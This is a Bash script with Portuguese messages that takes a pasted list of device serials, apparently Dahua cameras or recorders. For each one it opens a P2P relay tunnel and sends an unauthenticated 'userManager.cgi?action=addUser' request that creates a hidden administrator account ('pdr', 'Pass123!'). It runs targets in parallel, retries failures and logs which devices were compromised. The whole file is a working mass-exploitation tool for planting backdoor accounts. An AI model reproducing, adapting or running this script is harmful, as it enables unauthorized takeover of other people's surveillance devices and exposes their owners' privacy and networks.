#!/usr/bin/env bash
set -u

DHP2P="./target/release/dh-p2p"
MAX_SIMULT=3
BASE_PORT=8080
TIME_READY=12
TIMEOUT=3

URL_PATH="/cgi-bin/userManager.cgi?action=addUser&user.Name=pdr&user.Password=Pass123!&user.Group=admin&user.Sharable=true&user.Reserved=false&user.Memo="

RESULT_DIR="/scan/massa_resultados_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$RESULT_DIR"

# Cores
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

print_header() {
    printf "\n${BLUE}══════════════════════════════════════════════════════${NC}\n"
    printf "${CYAN} %s${NC}\n" "$1"
    printf "${BLUE}══════════════════════════════════════════════════════${NC}\n\n"
}

print_status() {
    local serial="$1"
    local status="$2"
    local extra="${3:-}"
    if [[ $status == "OK" ]]; then
        printf "${GREEN}✓ ${serial} → OK${NC} ${extra}\n"
    elif [[ $status == "FALHA" ]]; then
        printf "${RED}✗ ${serial} → FALHA${NC} ${extra}\n"
    else
        printf "${YELLOW}• ${serial} → ${status}${NC} ${extra}\n"
    fi
}

echo "Cole os seriais (ENTER em branco para iniciar):"
SERIAIS=()
while IFS= read -r line; do
    [[ -z "${line// }" ]] && break
    SERIAIS+=("$line")
done

[[ ${#SERIAIS[@]} -eq 0 ]] && { echo "Nenhum serial informado. Saindo."; exit 1; }

processar() {
    local SERIAL="$1"
    local PORT="$2"
    local RESULT_FILE="$RESULT_DIR/$SERIAL"
    local TUNLOG=$(mktemp --tmpdir dh-tunlog.XXXXXX)

    print_header "Processando $SERIAL → porta $PORT"

    # Limpa porta
    sudo fuser -k "${PORT}"/tcp >/dev/null 2>&1

    # Inicia o túnel em background
    echo -e "${CYAN}Iniciando túnel para $SERIAL...${NC}"
    $DHP2P "$SERIAL" -p "127.0.0.1:$PORT:80" --relay >"$TUNLOG" 2>&1 &
    local TUN_PID=$!

    # Aguarda sinal de ready
    local READY=0
    for i in $(seq 1 $((TIME_READY * 10))); do
        if grep -qiE 'ready|connect|relay|listening' "$TUNLOG" 2>/dev/null; then
            READY=1
            break
        fi
        sleep 0.1
    done

    if [[ $READY -eq 0 ]]; then
        echo -e "${RED}Túnel não subiu em ${TIME_READY}s${NC}"
        kill "$TUN_PID" 2>/dev/null
        echo "FALHA" > "$RESULT_FILE"
        rm -f "$TUNLOG"
        print_status "$SERIAL" "FALHA" "túnel não iniciou"
        return
    fi

    echo -e "${GREEN}Túnel OK → porta $PORT${NC}"
    sleep 0.8

    # ───────────────────────────────────────────────────────────────
    echo -e "${CYAN}Executando curl...${NC}"

    local CURL_OUTPUT HTTP_CODE CURL_EXIT

    CURL_OUTPUT=$(curl -s -o /dev/null \
        --write-out "%{http_code}\n%{exitcode}\n" \
        --connect-timeout 2 \
        --max-time "$TIMEOUT" \
        "http://127.0.0.1:$PORT$URL_PATH" 2>&1)

    CURL_EXIT=$(echo "$CURL_OUTPUT" | tail -n 1)
    HTTP_CODE=$(echo "$CURL_OUTPUT" | tail -n 2 | head -n 1)

    if [[ "$CURL_EXIT" == "28" ]]; then
        echo -e "${YELLOW}Timeout (${TIMEOUT}s)${NC}"
        print_status "$SERIAL" "FALHA" "timeout"
        echo "FALHA" > "$RESULT_FILE"
    elif [[ "$CURL_EXIT" != "0" ]]; then
        print_status "$SERIAL" "FALHA" "curl erro $CURL_EXIT"
        echo "FALHA" > "$RESULT_FILE"
        # Debug em falha
        echo -e "${YELLOW}Saída curl (erro de conexão):${NC}"
        echo "$CURL_OUTPUT" | sed 's/^/ | /'
    elif [[ "$HTTP_CODE" == "200" ]]; then
        print_status "$SERIAL" "OK"
        echo "OK" > "$RESULT_FILE"
    else
        print_status "$SERIAL" "FALHA" "HTTP $HTTP_CODE"
        echo "FALHA" > "$RESULT_FILE"
        echo -e "${YELLOW}Código HTTP recebido: ${HTTP_CODE}${NC}"
        # Se quiser ver mais detalhes da falha, pode adicionar outro curl -v aqui
    fi

    # Limpeza final
    kill "$TUN_PID" 2>/dev/null
    sudo fuser -k "${PORT}"/tcp >/dev/null 2>&1
    rm -f "$TUNLOG"
}

rodada() {
    local lista=("$@")
    local idx=0
    for serial in "${lista[@]}"; do
        while [[ $(jobs -r | wc -l) -ge $MAX_SIMULT ]]; do
            sleep 0.3
        done
        local port=$((BASE_PORT + idx))
        idx=$(( (idx + 1) % MAX_SIMULT ))
        processar "$serial" "$port" &
    done
    wait
}

print_header "Iniciando primeira rodada (${#SERIAIS[@]} dispositivos)"
rodada "${SERIAIS[@]}"

# Coleta falhas para reexecução
FALHAS=()
for s in "${SERIAIS[@]}"; do
    res=$(cat "$RESULT_DIR/$s" 2>/dev/null || echo "FALHA")
    [[ $res != "OK" ]] && FALHAS+=("$s")
done

if [[ ${#FALHAS[@]} -gt 0 ]]; then
    print_header "Reexecutando ${#FALHAS[@]} falhas em portas novas"
    BASE_PORT=$((BASE_PORT + MAX_SIMULT))
    rodada "${FALHAS[@]}"
fi

# Resultado final
print_header "Resultado final"
for s in "${SERIAIS[@]}"; do
    res=$(cat "$RESULT_DIR/$s" 2>/dev/null || echo "FALHA")
    print_status "$s" "$res"
done

echo
echo -e "${CYAN}Resultados salvos em:${NC} $RESULT_DIR"
echo -e "Total OK   : $(find "$RESULT_DIR" -type f -exec grep -l '^OK$' {} + | wc -l 2>/dev/null || echo 0)"
echo -e "Total FALHA: $(find "$RESULT_DIR" -type f -exec grep -l '^FALHA$' {} + | wc -l 2>/dev/null || echo 0)"
